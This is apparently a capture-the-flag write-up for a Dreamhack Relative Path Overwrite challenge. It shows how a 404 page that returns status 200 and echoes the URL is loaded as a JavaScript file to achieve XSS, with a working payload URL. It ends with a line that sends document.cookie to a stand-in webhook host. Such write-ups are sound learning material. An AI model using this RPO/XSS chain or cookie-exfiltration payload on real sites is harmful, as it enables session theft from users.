# Relative Path Overwrite Advanced
This challenge involves RPO and crazy XSS using 404 page

## Observation
- `vuln.php` try to import **filter.js**
- `404.php` return code 200 + the url
- `000-default.conf` change url with file extension of .js or .css into /asset/\<url> and return `404.php` if file is not found

## Solve
Since `vuln.php` needs a filter.js to not return "nope", let's try to create our own filter.js file content. 

We notice that when getting a non existent file, the `404.php` appears:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/42b297677647fcc2ba56d555b2af68135338e23b012824faf3393593b8822ceb.png)
Code of `404.php`: 
```php
<?php 
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found."; 
?>
```

so if we modify the url, we can effectively make 404 return whatever we want, including javascript code, which is useful since `vuln.php` is wanting a js file

So after some researching, I found this clever payload to glue everything together:
```
http://chall.site/index.php/;alert(1);//?page=vuln&param=whateveridontcare
```
This payload does:
-> request `vuln.php`
-> `vuln.php` tries to import **filter.js** as script
-> no **filter.js** found so it returns `404.php` 
-> `404.php` return our url content (`index.php/;alert(1);//?page=vuln...`) and code 200 (tells vuln.php import is successful and **fetch the output of 404.php as filter.js contents**) 
-> **JS syntax**: 2 semicolon to separate commands, `//` comment the rest of the return
-> Runs our payload as javascript: **we've achieved xss**
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/2f1137723253527c45addc9f1396544b86ed9d83f18f8f8c2ee9db04b251f3f8.png)
**Our 404.php inject being interpret as filter.js:**
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/bdcf090619a445e4f0a0857a45034d6e55cdca2aab41c8550ae4a1ff733c7d76.png)

Now just replace `alert(1)` to `location.href='http://yourwebhook.site'+document.cookie` and report the url:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/7dcc0964064fdc3d285836e39dd1281e56a52a999adcacdb417b9f778a0e46d2.png)
